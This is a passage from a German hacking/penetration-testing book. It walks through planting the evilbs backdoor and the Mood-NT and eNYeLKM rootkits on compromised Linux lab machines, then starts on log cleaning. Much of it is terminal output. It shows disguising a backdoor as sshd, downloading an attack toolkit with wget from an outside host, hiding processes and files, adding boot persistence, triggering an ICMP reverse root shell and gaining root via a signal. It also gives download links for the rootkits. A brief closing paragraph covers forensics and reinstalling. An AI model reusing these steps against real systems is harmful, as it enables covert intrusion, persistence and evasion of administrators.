SSH-Schl\u00fcssel.\n233\nhttp://www.bluepillproject.org\n234\nhttp://www.blackhat.com/html/bh-usa-06/bh-usa-06-speakers.html#Rutkowska\n235\nhttp://en.wikipedia.org/wiki/System_Management_Mode\n236\nhttp://www.phrack.com/issues.html?issue=58&id=7\n237\nhttp://www.blackhat.com/presentations/bh-europe-09/Lineberry/BlackHat-Europe-2009-Lineberry-codeinjection-via-dev-mem.pdf\n238\nhttp://old.nabble.com/--Advisory:-Linux-Compromises---Please-review--td19039450.html\n239\nhttp://www.dfn-cert.de\n240\nhttp://hep.uchicago.edu/admin/report_072808.html\n500\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\nIm Folgenden widmen wir uns dem Linux-Rechner mit der IP-Adresse 192.168.1.211 und erinnern uns daran, dass sich durch ein unverschl\u00fcsselt \u00fcbertragenes FTP-Kennwort eine SSH-Shell mit Benutzerrechten erbeuten lie\u00df. Ein Kernel-Exploit verschaffte uns anschlie\u00dfend Root-Rechte. Eine beliebte Methode, den kompromittierten Rechner auch f\u00fcr zuk\u00fcnftige Projekte \u00bbwarmzuhalten\u00ab, ist die Integration einer Backdoor oder eines Rootkits. Zur Veranschaulichung demonstrieren wir die Funktionsweise zun\u00e4chst an einer Backdoor namens \u00bbevilbs\u00ab.\n18.8.1 evilbs Bei evilbs241 handelt es sich um eine klassische Bindshell-Backdoor f\u00fcr Linux, die es dem unberechtigten Benutzer erm\u00f6glicht, unter Umgehung der normalen Zugriffssicherung einen versteckten Zugang zum eroberten System zu erlangen. Die versteckte Bindshell verf\u00fcgt \u00fcber eine symmetrische AES-256-Bit-Verschl\u00fcsselung, bietet einen Reverse-Verbindungsaufbau an, versteht sich im Umgang mit SOCKS4-Proxies und bietet M\u00f6glichkeiten des Dateitransfers. Zun\u00e4chst entpacken wir den Tarball auf unserem System... root@discordia:/home/evil# cd eviltools/backdoors/ root@discordia:/home/evil/eviltools/backdoors# ls -l total 8 drwxr-xr-x 2 root root 4096 Mar 3 22:25 evilbs drwxr-xr-x 2 root root 4096 Mar 3 22:25 rathole root@discordia:/home/evil/eviltools/backdoors# cd evilbs/ root@discordia:/home/evil/eviltools/backdoors/evilbs# ls -l total 32 -rw-r--r-- 1 root root 28882 Mar 2 21:43 evilbs.tar.gz root@discordia:/home/evil/eviltools/backdoors/evilbs# tar xzf evilbs.tar.gz root@discordia:/home/evil/eviltools/backdoors/evilbs# cd evilbs root@discordia:/home/evil/eviltools/backdoors/evilbs/evilbs# ls -al total 164 drwxr-xr-x 2 root root 4096 Feb 17 18:12 . drwxr-xr-x 3 root root 4096 Mar 6 23:13 .. -rw-r--r-- 1 root root 4751 Feb 17 16:13 README -rwxr-xr-x 1 root root 11856 Feb 17 18:11 build.sh -rw-r--r-- 1 root root 6063 Feb 17 16:23 client-socks.c -rw-r--r-- 1 root root 5501 Feb 17 16:15 client.c -rw-r--r-- 1 root root 0 Feb 17 18:12 config.h -rw-r--r-- 1 root root 1488 Feb 17 13:56 genip.c -rw-r--r-- 1 root root 16839 Feb 17 18:07 main.c -rw-r--r-- 1 root root 12627 Feb 17 13:56 obfuscate.c -rw-r--r-- 1 root root 3280 Feb 17 13:56 obfuscate.h -rw-r--r-- 1 root root 5805 Feb 17 18:00 revclient.c -rw-r--r-- 1 root root 57423 Feb 17 13:56 rijndael.c -rw-r--r-- 1 root root 609 Feb 17 13:56 rijndael.h root@discordia:/home/evil/eviltools/backdoors/evilbs/evilbs#\n241\nhttp://www.gat3way.eu/poc/evilbs/evilbs.tar.gz\n18.8 Linux unter Kontrolle: Rootkits installieren\n501\n...und kompilieren anschlie\u00dfend die f\u00fcr die Backdoor erforderlichen Komponenten durch Eingabe von ./build.sh \u2013 f\u00fcr die AES-Passphrase verwenden wir eine beliebige Zahlenkombination, deklarieren den Prozess der Bindshell mit einen unverd\u00e4chtigen sshd und w\u00e4hlen einen TCP-Port: root@discordia:/home/evil/eviltools/backdoors/evilbs/evilbs# ./build.sh Enter your AES encryption passphrase: 34534534545758678436456456 Enter bindshell process name (e.g httpd, [kswapd], etc): sshd Type 'y' if you want the bindshell to wipe its binary after execution Type if you don't want it to self-delete its binary\nType 'y' if you want the bindshell try to reverse connect Type if you wish it to listen for connections\nEnter the TCP port number to listen to (use port number ] 48.292 --.-K/s in 0,07s 2010-03-06 16:57:25 (692 KB/s) \u2013 \"sshd\" gespeichert [48292/48292] sh-3.2:/usr/bin# chmod 755 sshd sh-3.2:/usr/bin# /usr/bin/sshd sh-3.2:/usr/bin# exit\nDer erste Login durch die Backdoor gestaltet sich simpel. Beim Kompilieren ist neben der Serverkomponente auch die Datei \u00bbclient\u00ab entstanden, die wir mit ./client aufrufen. Nach dem Verbindungsaufbau sind wir in der Lage, beliebige Kommandos abzusetzen, die Hintert\u00fcr ist somit erfolgreich platziert. root@discordia:/home/evil/eviltools/backdoors/evilbs/evilbs# ./client Usage: ./client root@discordia:/home/evil/eviltools/backdoors/evilbs/evilbs# ./client 192.168.1.214 31337 AES256 Key: 1415250B09342F15010C0C0A140B181D1B161415250A26270B06130C26160B13 Welcome :D w 16:47:38 up 2 days, 22:38, 0 users, load average: 0,00, 0,00, 0,00 ps -aux USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT Warning: bad ps syntax, perhaps a bogus '-'? See http://procps.sf.net/faq.html USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND root 1 0.0 0.1 2100 684 ? Ss Mar03 0:02 init [2] root 2 0.0 0.0 0 0 ? S< Mar03 0:00 [kthreadd] root 3 0.0 0.0 0 0 ? S< Mar03 0:00 [migration/0] (...)\n504 root\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\n0.0\n1796\n288 ?\nS\n16:43\n0:00 sshd\nroot 4735 0.3 0.0 root 4740 0.4 0.0 /sbin/getty 38400 tty1 root 4749 0.0 0.0 root 4750 6.0 0.2 root 4752 0.0 0.1 ifconfig\n4734\n0.0\n1796 1764\n372 ? 504 tty1\nSs Ss+\n16:43 16:45\n0:00 sshd 0:00\nS R R\n16:47 16:47 16:47\n0:00 sshd 0:00 sshd 0:00 ps -aux\n1796 3836 3716\n296 ? 1140 ? 1032 ?\neth0\nLink encap:Ethernet Hardware Adresse 00:0c:29:87:a3:13 inet Adresse:192.168.1.214 Bcast:192.168.1.255 Maske:255.255.255.0 inet6-Adresse: fe80::20c:29ff:fe87:a313/64 G\u00fcltigkeitsbereich:Verbindung UP BROADCAST RUNNING MULTICAST MTU:1500 Metrik:1 RX packets:55813 errors:0 dropped:0 overruns:0 frame:0 TX packets:1513 errors:0 dropped:0 overruns:0 carrier:0 Kollisionen:0 Sendewarteschlangenl\u00e4nge:1000 RX bytes:3810108 (3.6 MiB) TX bytes:157394 (153.7 KiB) Interrupt:19 Basisadresse:0x2000 (...)\n18.8.2 Mood-NT evilbs verschafft einem Angreifer zwar Zugriff zum fremden System, uneingeschr\u00e4nkte M\u00f6glichkeiten der Entfaltung erh\u00e4lt man jedoch erst durch die Einbindung eines Rootkits. Bei dem im Folgenden vorzustellenden Mood-NT242 handelt es sich um ein Rootkit, das \u2013 anders als das in der Erstausgabe dieses Buches behandelte t0rnkit243 \u2013 weder Programmpakete austauscht noch von Loadable Kernel Modules abh\u00e4ngig ist. MoodNT wird \u00fcber /dev/kmem geladen und modifiziert somit direkt den Speicher. Zudem versteckt Mood-NT Prozesse, Verzeichnisse, Dateien und Verbindungen, protokolliert den Output interessanter Vorg\u00e4nge (SSH, FTP, su...) und beinhaltet unter anderem eine passwortgesch\u00fctzte Authentifizierung.\n242\nhttp://darkangel.antifork.org/codes.htm\n243\nhttp://packetstormsecurity.org/UNIX/penetration/rootkits/tk.tgz\n18.8 Linux unter Kontrolle: Rootkits installieren\n505\nDurch den mittels evilbs aufgebauten Kanal erstellen wir zun\u00e4chst ein Verzeichnis, \u00fcbertragen unsere t\u00f6dliche Fracht und entpacken anschlie\u00dfend das Rootkit: cd /home/ mkdir evil cd evil/ wget http://www.w00t.da.ru/eviltools.tgz --2010-03-07 12:38:27-- http://www.w00t.da.ru/eviltools.tgz Aufl\u00f6sen des Hostnamen \"www.w00t.da.ru\".... 213.172.16.20 Verbindungsaufbau zu www.w00t.da.ru|213.172.16.20|:80... verbunden. HTTP Anforderung gesendet, warte auf Antwort... 200 OK L\u00e4nge: 20769540 (20M) [text/plain] In \"eviltools.tgz\" speichern. 100%[====================================================================== ============================>] 20.769.540 597K/s in 35s 2010-03-07 12:39:02 (581 KB/s) \u2013 \"eviltools.tgz\" gespeichert [20769540/20769540] tar xfz eviltools.tgz cd eviltools/rootkits/ ls -l insgesamt 36 drwxr-xr-x 2 root root 4096 drwxr-xr-x 2 root root 4096 drwxr-xr-x 2 root root 4096 drwxr-xr-x 2 root root 4096 drwxr-xr-x 2 root root 4096 drwxr-xr-x 2 root root 4096 drwxr-xr-x 2 root root 4096 drwxr-xr-x 2 root root 4096 drwxr-xr-x 2 root root 4096 cd mood-nt/ tar xzf mood-nt-ctf.tgz cd mood-nt ls -lt insgesamt 24 drwxr-xr-x 2 root root drwxr-xr-x 2 root root drwxr-xr-x 2 root root -rw-r--r-- 1 root root -rw-r--r-- 1 root root -rw-r--r-- 1 root root\n3. 4. 5. 3. 4. 3. 5. 4. 3.\nM\u00e4r M\u00e4r M\u00e4r M\u00e4r M\u00e4r M\u00e4r M\u00e4r M\u00e4r M\u00e4r\n22:24 10:47 15:31 22:24 10:47 23:57 15:41 10:51 22:24\nadore-ng boxer enyelkm mood-nt override phalanx pingrootkit suckit superkit\n4096 7. M\u00e4r 4096 7. M\u00e4r 4096 3. Dez 310 1. Dez 0 27. Nov 5029 6. Apr\n12:40 12:39 2008 2008 2008 2007\ncore lib include Makefile cthulhu README\n506\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\nDie entsprechenden Entwicklerwerkzeuge vorausgesetzt, erfolgt die Kompilierung des Rootkits durch make. Die Eingabe von mood-nt \u2013h liefert eine Zusammenfassung der Parameter: make Making libs make[1]: Entering directory '/home/evil/eviltools/rootkits/mood-nt/moodnt/lib' make[1]: Leaving directory '/home/evil/eviltools/rootkits/mood-nt/moodnt/lib' Making core make[1]: Entering directory '/home/evil/eviltools/rootkits/mood-nt/moodnt/core' 'which diet' gcc -s -I /usr/include/diet -I ../include/ -w -fno-builtin nostdlib -O2 -c ./charger.c ./buildobject make[1]: Leaving directory '/home/evil/eviltools/rootkits/mood-nt/moodnt/core' Linking core/charger.o: In function 'poll_for_proc': charger.c:(.text+0x3cf): warning: warning: your code uses stdio (7+k bloat). core/charger.o: In function 'main': charger.c:(.text+0x1b2d): warning: warning: system() is a security risk. Use fork and execvp instead! /usr/lib/diet/lib-i386/libc.a(vprintf.o): In function 'vprintf': vprintf.c:(.text+0x20): warning: warning: the printf functions add several kilobytes of bloat. /usr/lib/diet/lib-i386/libc.a(vfscanf.o): In function 'vfscanf': vfscanf.c:(.text+0x28): warning: warning: the scanf functions add several kilobytes of bloat. Done! ls -lt insgesamt 104 drwxr-xr-x 2 root root 4096 7. M\u00e4r 12:40 core -rwxr-xr-x 1 root root 74064 7. M\u00e4r 12:40 mood-nt drwxr-xr-x 2 root root 4096 7. M\u00e4r 12:39 lib drwxr-xr-x 2 root root 4096 3. Dez 2008 include -rw-r--r-- 1 root root 310 1. Dez 2008 Makefile -rw-r--r-- 1 root root 0 27. Nov 2008 cthulhu -rw-r--r-- 1 root root 5029 6. Apr 2007 README ./mood-nt -h\n18.8 Linux unter Kontrolle: Rootkits installieren\n507\n************* Mood-NT CTF Edition (beta) ************** ******************************************************* ********* (bad)coded by\n[[email protected]](/cdn-cgi/l/email-protection)\n******** ******************************************************* * Written for educational purposes only, don't use it * ******* if you do, you are the only responsable ******* ******************************************************* Mood's usage: -V value -P value -S value -C value -r value -D value -d -k value -M value -A key -H value -U value -F path -f path -u value -m -R -h\nset vmalloc address set printk address set sys call table address set smp_call_function address set register_die_notifier address set do_debug address start with default values and parsers set mood-nt's key force an engine: [b|l|e] for basic,legacy,elite Authenticate to Mood-NT Hide target pid Unhide target pid Hide target file Unhide target file set vfree address Use /dev/mem instead of /dev/kmem Remove Mood-NT this help\nDurch ./mood-nt -k wird das Rootkit aktiviert (alternativ auch \u00fcber ./mood-nt \u2013d durchzuf\u00fchren \u2013 dann jedoch mit Standardwerten), die Einbindung ist damit erfolgreich abgeschlossen. ./mood-nt -k 0xdccce0dd ************* Mood-NT CTF Edition (beta) ************** ******************************************************* ********* (bad)coded by\n[[email protected]](/cdn-cgi/l/email-protection)\n******** ******************************************************* * Written for educational purposes only, don't use it * ******* if you do, you are the only responsable ******* ******************************************************* Polling for procfs, please wait...FOUND! Looking for addresses: \u2013 do_debug...FOUND! \u2013 smp_call_function...FOUND!\n508\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\n\u2013 printk...FOUND! \u2013 register_die_notifier...FOUND! \u2013 vfree...FOUND! \u2013 vmalloc...FOUND! Allocation at e02fc000 Relocs: 854 Setting key to 0xdccce0dd Setting up for reboot: Copying init and us instead of init...DONE! Creating our dir...DONE! Creating init script in /_cthulhu for our applications...DONE! Saving my values for further reactivations...DONE! Mood-NT ACTIVATED in true elite mode\nNicht unerw\u00e4hnt lassen m\u00f6chten wir die elementaren Funktionen von Mood-NT. So erfolgt durch ./mood-nt -A eine Authentifizierung und somit die \u00d6ffnung des Eingabekanals, ... ./mood-nt -A 0xdccce0dd ************* Mood-NT CTF Edition (beta) ************** ******************************************************* ********* (bad)coded by\n[[email protected]](/cdn-cgi/l/email-protection)\n******** ******************************************************* * Written for educational purposes only, don't use it * ******* if you do, you are the only responsable ******* ******************************************************* Success!\n./mood-nt -H maskiert \u00bbunpopul\u00e4re\u00ab und somit von uns zu verbergende Prozesse... ./mood-nt -H 1637 Success!\n...und ./mood-nt -F versteckt Verzeichnisse respektive Dateien. ./mood-nt -F /home/evil Success!\nAls zus\u00e4tzliches Bonbon beherbergt das Verzeichnis /cthulhu/ in Form der Dateien mood-nt.conf, mood-nt.init und mood-nt.sniff interessante Init-/Logfiles, die sich nach Wochen der stillen Sammlung um wertvolle Inhalte bereichert haben sollten.\n18.8 Linux unter Kontrolle: Rootkits installieren\n509\n18.8.3 eNYeLKM Mit eNYeLKM244 von eNYe Sec245 erfolgt die abschlie\u00dfende Vorstellung eines LKM-Rootkits \u2013 wohl wissend, dass das soeben vorgestellte Mood-NT zur Klasse der KMEM-Rootkits geh\u00f6rt und somit auf der derzeit fortschrittlichsten Technologiestufe f\u00fcr LinuxRootkits operiert. eNYeLKM stellt jedoch aus Sicht der Autoren ein effizientes Werkzeug dar, welches sich schnell und unkompliziert im Sinne einer \u00bbGood-Enough-Strategy\u00ab einsetzen l\u00e4sst und zugleich als sch\u00f6nes Beispiel f\u00fcr die Vielseitigkeit von Rootkits dient. So bietet eNYeLKM neben traditionellen Funktionen wie dem Maskieren von Dateien, Verzeichnissen, Eintr\u00e4gen und Prozessen auch eine verborgene Reverse-Shell, die sich nur durch einen speziellen Connector \u00fcber ICMP-Pakete wachk\u00fcssen l\u00e4sst. Zur Veranschaulichung widmen wir uns dem Linux-Rechner mit der IP-Adresse 192.168.1.220, den wir \u00fcber einen verwundbaren Samba-Dienst an unser Ncat andocken und anschlie\u00dfend eine Reverse-Root-Shell aufbauen lie\u00dfen. Die vorbereitenden T\u00e4tigkeiten auf unserem System halten sich in Grenzen: Der Tarball246 von eNYeLKM will entpackt und der Quelltext des Connectors mit make connect kompiliert werden, der Start erfolgt durch ./connect [port]: root@discordia:/home/evil# ls -l total 12 -rw-r--r-- 1 root root 9712 Feb 20 2006 enyelkm.en.v1.1.tar.gz root@discordia:/home/evil# tar xvfz enyelkm.en.v1.1.tar.gz enyelkm.en.v1.1/ enyelkm.en.v1.1/Makefile enyelkm.en.v1.1/kill.c enyelkm.en.v1.1/ls.c enyelkm.en.v1.1/config.h enyelkm.en.v1.1/base.c enyelkm.en.v1.1/kill.h enyelkm.en.v1.1/ls.h enyelkm.en.v1.1/read.c enyelkm.en.v1.1/read.h enyelkm.en.v1.1/connect.c enyelkm.en.v1.1/remoto.h enyelkm.en.v1.1/remoto.c enyelkm.en.v1.1/README.txt enyelkm.en.v1.1/DESCRIPTION.txt root@discordia:/home/evil# cd enyelkm.en.v1.1 root@discordia:/home/evil/enyelkm.en.v1.1# make connect\n244\nhttp://www.packetstormsecurity.org/UNIX/penetration/rootkits/enyelkm.en.v1.1.tar.gz\n245\nhttp://www.enye-sec.org\n246\nhttp://www.packetstormsecurity.org/UNIX/penetration/rootkits/enyelkm.en.v1.1.tar.gz\n510\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\n----------------------------------------ENYELKM v1.1 by RaiSe\n[[email protected]](/cdn-cgi/l/email-protection)\n| www.enye-sec.org ----------------------------------------gcc connect.c -o connect -Wall root@discordia:/home/evil/enyelkm.en.v1.1# ls -lt total 80 -rwxr-xr-x 1 root root 8470 Mar 6 22:34 connect -rw-r--r-- 1 504 504 6367 Feb 15 2006 read.c -rw-r--r-- 1 504 504 1973 Feb 15 2006 Makefile -rw-r--r-- 1 504 504 5823 Feb 15 2006 base.c -rw-r--r-- 1 504 504 288 Feb 15 2006 config.h -rw-r--r-- 1 504 504 3800 Feb 15 2006 connect.c -rw-r--r-- 1 504 504 2167 Feb 15 2006 README.txt -rw-r--r-- 1 504 504 212 Feb 15 2006 DESCRIPTION.txt -rw-r--r-- 1 504 504 6213 Feb 14 2006 remoto.c -rw-r--r-- 1 504 504 238 Feb 13 2006 remoto.h -rw-r--r-- 1 504 504 1107 Feb 12 2006 kill.c -rw-r--r-- 1 504 504 76 Feb 12 2006 kill.h -rw-r--r-- 1 504 504 293 Feb 12 2006 read.h -rw-r--r-- 1 504 504 2460 Feb 12 2006 ls.c -rw-r--r-- 1 504 504 127 Feb 12 2006 ls.h root@discordia:/home/evil/enyelkm.en.v1.1# ./connect Utility to connect reverse shell from enyelkm: ./connect ip_dest [port] root@discordia:/home/evil/enyelkm.en.v1.1#\nNachdem wir den Connector erfolgreich \u00fcbersetzt haben, erfolgt die Einbindung des LKM-Moduls auf der Seite unseres Opfers: Hierzu erstellen wir zun\u00e4chst ein Verzeichnis, \u00fcbertragen den Tarball, entpacken diesen und kompilieren den Quelltext durch make (abermals die entsprechenden Entwicklerwerkzeuge vorausgesetzt). Die Eingabe von make install setzt ein abschlie\u00dfendes Skript in Bewegung, welches die \u00fcbersetzte Datei enyelkm.ko nach /etc/.enyelkmHIDE^IT.ko kopiert, /etc/rc.d/rc.sysinit um einen versteckten Boot-Eintrag bereichert, verr\u00e4terische Zeitstempel korrigiert und mit insmod /etc/.enyelkmHIDE^IT.ko daf\u00fcr sorgt, dass das Kernel-Modul stante pede dem LinuxKernel \u00fcbergeben wird. Fertig!\n18.8 Linux unter Kontrolle: Rootkits installieren\n511\ncd /home mkdir evil_HIDE^IT cd evil_HIDE^IT/ wget http://www.w00t.da.ru/eviltools.tgz --22:08:00-- http://www.w00t.da.ru/eviltools.tgz => 'eviltools.tgz' Resolving www.w00t.da.ru... 213.172.16.20 Connecting to www.w00t.da.ru[213.172.16.20]:80... connected. HTTP request sent, awaiting response... 200 OK Length: 20,769,540 [text/plain] 100%[=====================================================================> ] 20,769,540 612.48K/s ETA 00:00 22:08:34 (602.12 KB/s) \u2013 'eviltools.tgz' saved [20,769,540/20,769,540] ls -l total 20308 -rw-r--r-- 1 root root 20769540 Mar 6 tar xfz eviltools.tgz cd eviltools cd rootkits/ cd enyelkm/ tar xfz enyelkm.en.v1.1.tar.gz cd enyelkm.en.v1.1 ls -l total 68 -rw-r--r-- 1 504 504 5823 Feb 15 2006 -rw-r--r-- 1 504 504 288 Feb 15 2006 -rw-r--r-- 1 504 504 3800 Feb 15 2006 -rw-r--r-- 1 504 504 212 Feb 15 2006 -rw-r--r-- 1 504 504 1107 Feb 12 2006 -rw-r--r-- 1 504 504 76 Feb 12 2006 -rw-r--r-- 1 504 504 2460 Feb 12 2006 -rw-r--r-- 1 504 504 127 Feb 12 2006 -rw-r--r-- 1 504 504 1973 Feb 15 2006 -rw-r--r-- 1 504 504 6367 Feb 15 2006 -rw-r--r-- 1 504 504 293 Feb 12 2006 -rw-r--r-- 1 504 504 2167 Feb 15 2006 -rw-r--r-- 1 504 504 6213 Feb 14 2006 -rw-r--r-- 1 504 504 238 Feb 13 2006 make\n15:04 eviltools.tgz\nbase.c config.h connect.c DESCRIPTION.txt kill.c kill.h ls.c ls.h Makefile read.c read.h README.txt remoto.c remoto.h\n512\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\n----------------------------------------ENYELKM v1.1 by RaiSe\n[[email protected]](/cdn-cgi/l/email-protection)\n| www.enye-sec.org ----------------------------------------make -C /lib/modules/2.6.11-1.1369_FC4/build SUBDIRS=/home/evil_HIDE^IT/eviltools/rootkits/enyelkm/enyelkm.en.v1.1 modules make[1]: Entering directory '/usr/src/kernels/2.6.11-1.1369_FC4-i686' CC [M] /home/evil_HIDE^IT/eviltools/rootkits/enyelkm/enyelkm.en.v1.1/base.o /home/evil_HIDE^IT/eviltools/rootkits/enyelkm/enyelkm.en.v1.1/base.c: In function \u2018init_module\u2019: /home/evil_HIDE^IT/eviltools/rootkits/enyelkm/enyelkm.en.v1.1/base.c:127: warning: assignment from incompatible pointer type CC [M] /home/evil_HIDE^IT/eviltools/rootkits/enyelkm/enyelkm.en.v1.1/kill.o CC [M] /home/evil_HIDE^IT/eviltools/rootkits/enyelkm/enyelkm.en.v1.1/ls.o /home/evil_HIDE^IT/eviltools/rootkits/enyelkm/enyelkm.en.v1.1/ls.c: In function \u2018hacked_getdents64\u2019: /home/evil_HIDE^IT/eviltools/rootkits/enyelkm/enyelkm.en.v1.1/ls.c:111: warning: ignoring return value of \u2018__copy_to_user\u2019, declared with attribute warn_unused_result CC [M] /home/evil_HIDE^IT/eviltools/rootkits/enyelkm/enyelkm.en.v1.1/read.o /home/evil_HIDE^IT/eviltools/rootkits/enyelkm/enyelkm.en.v1.1/read.c: In function \u2018hide_marcas\u2019: /home/evil_HIDE^IT/eviltools/rootkits/enyelkm/enyelkm.en.v1.1/read.c:155: warning: ignoring return value of \u2018__copy_to_user\u2019, declared with attribute warn_unused_result /home/evil_HIDE^IT/eviltools/rootkits/enyelkm/enyelkm.en.v1.1/read.c: In function \u2018ocultar_netstat\u2019: /home/evil_HIDE^IT/eviltools/rootkits/enyelkm/enyelkm.en.v1.1/read.c:252: warning: ignoring return value of \u2018__copy_to_user\u2019, declared with attribute warn_unused_result CC [M] /home/evil_HIDE^IT/eviltools/rootkits/enyelkm/enyelkm.en.v1.1/remoto.o LD [M] /home/evil_HIDE^IT/eviltools/rootkits/enyelkm/enyelkm.en.v1.1/enyelkm.o Building modules, stage 2. MODPOST CC /home/evil_HIDE^IT/eviltools/rootkits/enyelkm/enyelkm.en.v1.1/enyelkm.mod.o LD [M]\n18.8 Linux unter Kontrolle: Rootkits installieren\n513\n/home/evil_HIDE^IT/eviltools/rootkits/enyelkm/enyelkm.en.v1.1/enyelkm.ko make[1]: Leaving directory '/usr/src/kernels/2.6.11-1.1369_FC4-i686' gcc connect.c -o connect -Wall make install ----------------------------------------ENYELKM v1.1 by RaiSe\n[[email protected]](/cdn-cgi/l/email-protection)\n| www.enye-sec.org ----------------------------------------+ enyelkm.ko copy to /etc/.enyelkmHIDE^IT.ko + autoload hidden string installed on /etc/rc.d/rc.sysinit + enyelkm loaded !\nNach einem Logoff vom Fremdsystem widmen wir uns dem Connector und starten diesen \u00fcber ./connect 192.168.1.220: root@discordia:/home/evil/enyelkm.en.v1.1# ./connect 192.168.1.220 * Launching reverse_shell: Sending ICMP ... Waiting shell on port 8822 (it may delay some seconds) ... launching shell ... bash-3.00# id uid=0(root) gid=1217500843 bash-3.00# w w 22:34:45 up 11 min, 0 users, USER TTY FROM bash-3.00#\nload average: 0.00, 0.04, 0.05 LOGIN@ IDLE JCPU PCPU WHAT\nDas Rootkit gew\u00e4hrt uns durch eine Reverse-Root-Shell unkomplizierten Zugriff, angenehmer k\u00f6nnte es kaum sein. Sesam \u00f6ffne Dich! Fortan bewegen wir uns maskiert auf dem Fremdsystem, ohne dass der Eigent\u00fcmer des Rechners auch nur die leiseste Ahnung davon hat. eNYeLKM besticht jedoch auch an anderer Stelle durch seinen Minimalismus. So werden beispielsweise Dateien, Verzeichnisse und Prozesse, die den String HIDE^IT beinhalten, grunds\u00e4tzlich maskiert. Entsprechend verh\u00e4lt es sich mit Text- oder Konfigurationsdateien: Textinhalte, die zwischen der Zeichenfolge \u00bb#\u00ab und \u00bb#\u00ab stehen, werden nicht angezeigt. Im n\u00e4chsten Schritt wechseln wir in das f\u00fcr alle anderen unsichtbare Verzeichnis des Rootkits und breiten uns langsam aus. Dazu \u00fcbertragen wir eine Sammlung handverlesener Programme, die dazu beitragen, unsere Herrschaft auf diesem Rechner\n514\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\nzu manifestieren und schlussendlich das gesamte Netz an uns zu rei\u00dfen. Der Grundstein f\u00fcr kontrolliertes Chaos ist somit gelegt. Im Werkzeugkasten herangehender Netzwerkforscher befinden sich \u00fcblicherweise LogCleaner, Backdoors, Scanner, Sniffer, Exploits, Keylogger, der Full-Screen Window Manager screen, verschiedene Password-Cracker und Dictionaries, die wir aus Gr\u00fcnden der besseren Lesbarkeit jedoch erst im n\u00e4chsten Abschnitt aufgreifen werden. Erneut sehen nur wir, was wirklich auf dem System vor sich geht. Die offizielle Administration bleibt au\u00dfen vor und wundert sich vielleicht, dass der Rechner auf einmal tr\u00e4ge reagiert, obwohl die Prozessorauslastung nach Aussage der zur Verf\u00fcgung stehenden Sensoren eigentlich im zu vernachl\u00e4ssigenden Bereich liegt :-) Ein weiteres Bonbon von eNYeLKM werden insbesondere die Nutzer zu sch\u00e4tzen wissen, die zwar \u00fcber einen regul\u00e4ren User-Login verf\u00fcgen, aber keine Reverse-RootShell nutzen wollen. Durch Eingabe von kill \u2013s 58 12345 werden lokale Root-Rechte \u00fcbertragen. xxx@sambaserver:~$ kill \u2013s 58 12345 xxx@sambaserver:~$ id uid=0(root) gid=0(root) groups=0(root)\nWir halten abschlie\u00dfend somit fest, dass Rootkits aus Sicht des Gesch\u00e4digten eine diabolische Sache darstellen. Einmal installiert, kann ein Rootkit einem Angreifer den kompletten Zugriff auf einen Computer erm\u00f6glichen, ohne dass der Parasit aufzufallen droht. Dem makabren Schauspiel sind damit kaum Grenzen gesetzt, auch nicht vom Zeitrahmen her. Wer Opfer einer Rechner\u00fcbernahme geworden ist, muss zwangsl\u00e4ufig davon ausgehen, dass Hintert\u00fcren oder gar Rootkits im System eingepflanzt worden sind. Das bedeutet konkret, dass einem gekaperten Rechner keinerlei Vertrauen mehr entgegengebracht werden darf und die Installation einen Totalschaden darstellt. Das System ist \u2013 nach einer sorgf\u00e4ltigen forensischen Analyse mit dem Ziel, den Ursprung des Angriffs ausfindig zu machen \u2013 konsequenterweise neu aufzusetzen. Zudem sind vor Inbetriebnahme die L\u00f6cher des Einfalls zu stopfen, da sonst der kriminelle Netzwerkforscher jederzeit wieder einkehren kann.\n18.9\nLinux unter Kontrolle: Spuren verwischen mit Logfile-Cleaner\nWie bei einem realen Einbruch entstehen auch bei einem Einbruch in Computer Spuren, beispielsweise Eintr\u00e4ge in den Protokolldateien. Mit einem Logfile-Cleaner lassen sich die Spuren des Einstiegs automatisiert aus einer Vielzahl von Protokolldateien entfernen, um eine Rekonstruktion des Angriffs und die Identifizierung des Eindringlings zu vermeiden. Zwar haben die zum Einsatz gebrachten Exploits kaum verwertbare Spuren in Logfiles hinterlassen (der Kernel-Exploit taucht nicht im Logfile auf, und beim Samba-Exploit\n18.9 Linux unter Kontrolle: Spuren verwischen mit Logfile-Cleaner\n515\nreicht es aus, den jeweiligen Hosteintrag zu l\u00f6schen, beispielsweise /var/log/samba/ log.evil), eine Vorstellung der Logfile-Cleaner erscheint den Autoren dennoch sinnvoll. Zur Verdeutlichung der Arbeitsweise greifen wir abermals auf den Linux-Rechner zur\u00fcck, der uns \u00fcber das mitgeschnittene FTP-Kennwort eine Einstiegsluke per SSH erm\u00f6glichte. Der Blick in die Logdatei /var/log/auth.log des kompromittierten Systems l\u00e4sst erkennen, dass wir uns \u2013 bislang unerkannt in der Rolle des Benutzers \u00bbamueller\u00ab \u2013 per SSH von unserem PC mit der IP-Adresse 192.168.1.223 angemeldet haben. Um eine zeitnahe Entdeckung zu vermeiden, sollten wir unverz\u00fcglich handeln und die verr\u00e4terische Spur unseres Logins verschleiern. sh-3.2# tail -n 10 /var/log/auth.log Feb 15 22:56:44 ftpserver sshd[2714]: opened for user hlanger by (uid=0) Feb 15 22:57:46 ftpserver sshd[2714]: closed for user hlanger Feb 15 22:58:04 ftpserver sshd[2738]: 192.168.1.210 port 2232 ssh2 Feb 15 23:17:01 ftpserver CRON[2744]: opened for user root by (uid=0) Feb 15 23:17:01 ftpserver CRON[2744]: closed for user root Feb 15 23:43:43 ftpserver sshd[2758]: 192.168.1.28 port 2401 ssh2 Feb 15 23:43:43 ftpserver sshd[2758]: opened for user tkartes by (uid=0) Feb 15 23:44:01 ftpserver sshd[2775]: 192.168.1.223 port 2402 ssh2 Feb 15 23:44:01 ftpserver sshd[2775]: opened for user amueller by (uid=0) sh-3.2#\npam_unix(sshd:session): session pam_unix(sshd:session): session Failed password for root from pam_unix(cron:session): session pam_unix(cron:session): session Accepted password for tkartes from pam_unix(sshd:session): session Accepted password for amueller from pam_unix(sshd:session): session\nUm 